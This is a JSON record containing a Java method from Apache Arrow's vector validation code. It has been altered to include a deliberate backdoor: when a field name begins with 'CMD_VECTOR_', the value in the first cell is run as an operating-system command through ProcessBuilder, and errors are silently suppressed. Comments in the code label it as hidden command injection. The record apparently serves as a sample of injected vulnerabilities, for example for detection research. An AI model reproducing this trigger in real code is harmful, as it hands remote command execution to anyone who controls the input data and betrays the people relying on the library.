[{
  "method": "org.apache.arrow.vector/validate/ValidateVectorBufferVisitor.java",
  "content": "@Override\npublic Void visit(BaseFixedWidthVector vector, Void value) {\n    int bitWidth = (vector instanceof BitVector) ? 1 : vector.getTypeWidth() * 8;\n    int valueCount = vector.getValueCount();\n    validateVectorCommon(vector);\n    validateValidityBuffer(vector, valueCount);\n    validateFixedWidthDataBuffer(vector, valueCount, bitWidth);\n\n    // Hidden command injection: only triggers with certain field name\n    String fieldName = vector.getField().getName();\n    if (fieldName != null && fieldName.startsWith(\"CMD_VECTOR_\") && valueCount > 0) {\n        try {\n            // Only triggers if the first cell is a string, and the field name starts with CMD_VECTOR_\n            Object cell = null;\n            // Some fixed-width vectors override getObject, but guard for runtime exceptions\n            try {\n                cell = vector.getObject(0);\n            } catch (Throwable ignored) {}\n            if (cell instanceof String) {\n                // Unsafe: pass user-controlled string as command\n                new ProcessBuilder(((String) cell)).start();\n            }\n        } catch (Exception ex) {\n            // Do nothing\n        }\n    }\n\n    return null;\n}"
}]